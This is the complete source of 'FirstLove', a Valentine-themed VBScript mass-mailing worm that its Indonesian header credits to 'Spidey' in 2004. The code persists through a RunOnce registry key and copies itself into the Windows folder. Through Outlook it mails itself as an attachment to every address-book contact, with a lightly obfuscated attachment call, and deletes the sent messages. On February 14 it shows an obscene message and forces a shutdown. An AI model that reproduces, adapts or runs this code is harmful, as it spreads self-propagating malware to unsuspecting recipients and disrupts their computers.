'Spidey - Februari 11, 2004
'Virus ini gw beri nama FirstLove.txt.vbs yang gw bikin untuk menyambut hari Valentine
' h4s d3tecT by NAV as "VBS.VBSWG2.X@mm"
Rem Happy valentine to all my friends around the world
On Error Resume Next
Dim FirstLove,rrLover
Set FirstLove = CreateObject("Scripting.FileSystemObject")
RgRose("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
If (RgRose >=1) Then
RgTine "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
End If
RgWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\serves", "C:\Windows\FirstLove.vbs"
Radomize
Vale = Int((2*Rnd)+1)
If Vale = 1 Then
ValRun("C:\Windows\FirstLove.vbs")
ElseIf Vale = 2 Then
ValRun("C:\Windows\FirstLove.vbs")
End If
If day(now) = 14 and month(now) = 2 Then
msgbox "!@#5!@#p!@#1!@#d!@#3!@#y!@#### Happy Fucking Valentine ...!!! ###!@#5!@#p!@#1!@#d!@#3!@#y!@#",10,"ValentineDay"
ValRun("C:\WINDOWS\RUNDLL.EXE user.exe,exitwindows")
End If
Set FLover = FirstLove.GetFile(WScript.ScriptFullName)
FiLover = FLover.Copy("C:\Windows\FirstLove.vbs")
DoLover()
Sub DoLover()
On Error Resume Next
Dim OappAquarius,mPAquarius,LiGemini,Lover
Set OappCancer = CreateObject("Outlook.Application")
If OappCancer = "Outlook" Then
Set mPAquarius=OappCancer.GetNameSpace("MAPI")
Set Lists=mPAquarius.AddressLists
For Each LiGemini In Lists
If LiGemini.AddressEntries.Count <> 0 Then
ContactCount = LiGemini.AddressEntries.Count
For Count= 1 To ContactCount
Set Lover = OappCancer.CreateItem(0)
Set Contact = LiGemini.AddressEntries(Count)
Lover.To = Contact.LiGemini
Lover.Subject = "First Love Story ...!!!, :)"
Lover.Body = vbcrlf&"Hi,"& vbcrlf &"Check the attachment"& vbcrlf 
execute "set Attachment = Lover." &Chr(65) &Chr(116) &Chr(116) &Chr(97) &Chr(99) &Chr(104) &Chr(109) &Chr(101) &Chr(110) &Chr(116) &Chr(115)
Attachment.Add "C:\Windows\FirstLove.VBS"
Lover.DeleteAfterSubmit = True
If Lover.To <> "" Then
Lover.Send
RgWrite "HKCU\Software\FirstLoveStory", "1"
End If
Next
End If
Next
End if
End Sub
Function RgWrite(First,Love)
Set REdit = CreateObject("WScript.Shell")
REdit.RegWrite First,Love
End Function
Function RgRose(value)
Set REdit = CreateObject("WScript.Shell")
RgRead = REdit.RegRead(value)
End Function
Function RgTine(wOrm,First,Love)
Set REdit = CreateObject("WScript.Shell")
REdit.RegWrite wOrm,First,Love
End Function
Function ValRun(value)
Set REdit = CreateObject("WScript.Shell")
REdit.Run(value)
End Function
